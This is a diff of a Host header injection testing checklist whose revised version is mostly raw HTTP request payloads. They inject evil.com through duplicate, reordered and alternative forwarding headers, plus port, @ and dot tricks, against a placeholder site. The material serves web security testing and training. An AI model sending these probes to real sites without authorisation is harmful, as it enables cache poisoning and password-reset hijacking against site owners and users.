@@ -1,88 +1,128 @@
-STEP-BY-STEP CHECKLIST (follow strictly)
-STEP 1: Send baseline request
+## Host Header Injection – Step-by-Step Checklist
+
+### STEP 1: Baseline Request
 GET /example HTTP/1.1
 Host: vulnerable-website.com
 
 
-Confirm:
+---
 
-Normal response
-
-Note redirects
-
-Note absolute URLs
-
-Note cookies
-
-This is your control sample.
-
-STEP 2: Inject duplicate Host headers
+### STEP 2: Duplicate Host Headers
 GET /example HTTP/1.1
 Host: vulnerable-website.com
 Host: evil.com
 
 
-Send via:
+---
 
-Burp Repeater (mandatory)
-
-Disable auto header cleanup
-
-❌ Curl often normalizes this
-❌ Browsers won’t allow it
-
-STEP 3: Observe which Host is trusted
-
-Check carefully:
-
-Response body
-
-Redirect Location header
-
-Absolute links
-
-CSP headers
-
-Password reset links
-
-Cache behavior
-
-If you see:
-
-https://evil.com/...
+### STEP 3: Duplicate Host (Same Value First)
+GET /example HTTP/1.1
+Host: vulnerable-website.com
+Host: vulnerable-website.com
+Host: evil.com
 
 
-→ vulnerability confirmed.
+---
 
-If nothing changes → continue testing variants.
-
-STEP 4: Reverse header order (critical)
-
-Many people miss this.
-
+### STEP 4: Reverse Host Header Order
 GET /example HTTP/1.1
 Host: evil.com
 Host: vulnerable-website.com
 
+GET /example HTTP/1.1
+Host: evil.com
+Host: evil.com
+Host: vulnerable-website.com
 
-Why this matters:
 
-Some proxies use first
+---
 
-Some backends use last
-
-Order matters. Always test both.
-
-STEP 5: Test alternative host headers
-
-Some stacks accept:
-
+### STEP 5: Host + X-Forwarded-Host
+GET /example HTTP/1.1
+Host: vulnerable-website.com
 X-Forwarded-Host: evil.com
+
+GET /example HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: vulnerable-website.com
+
+
+---
+
+### STEP 6: Alternative Forward Headers
+GET /example HTTP/1.1
+Host: vulnerable-website.com
 X-Host: evil.com
+
+GET /example HTTP/1.1
+Host: vulnerable-website.com
 Forwarded: host=evil.com
 
-
-Also test combinations:
-
+GET /example HTTP/1.1
 Host: vulnerable-website.com
+X-HTTP-Host-Override: evil.com
+
+
+---
+
+### STEP 7: Port Injection
+GET /example HTTP/1.1
+Host: vulnerable-website.com:evil
+
+GET /example HTTP/1.1
+Host: vulnerable-website.com:1234
+
+
+---
+
+### STEP 8: @ Injection
+GET /example HTTP/1.1
+Host: vulnerable-website.com@evil.com
+
+GET /example HTTP/1.1
+Host: evil.com@vulnerable-website.com
+
+
+---
+
+### STEP 9: Dot Variations
+GET /example HTTP/1.1
+Host: vulnerable-website.com.
+
+GET /example HTTP/1.1
+Host: .vulnerable-website.com
+
+GET /example HTTP/1.1
+Host: vulnerable-website.com..evil.com
+
+
+---
+
+### STEP 10: Absolute URL in Request Line
+GET http://evil.com/example HTTP/1.1
+Host: vulnerable-website.com
+
+GET http://vulnerable-website.com/example HTTP/1.1
+Host: evil.com
+
+
+---
+
+### STEP 11: Case Sensitivity
+GET /example HTTP/1.1
+host: evil.com
+Host: vulnerable-website.com
+
+GET /example HTTP/1.1
+HOST: evil.com
+Host: vulnerable-website.com
+
+
+---
+
+### STEP 12: Multiple Header Combination
+GET /example HTTP/1.1
+Host: vulnerable-website.com
+Host: evil.com
 X-Forwarded-Host: evil.com
+Forwarded: host=evil.com
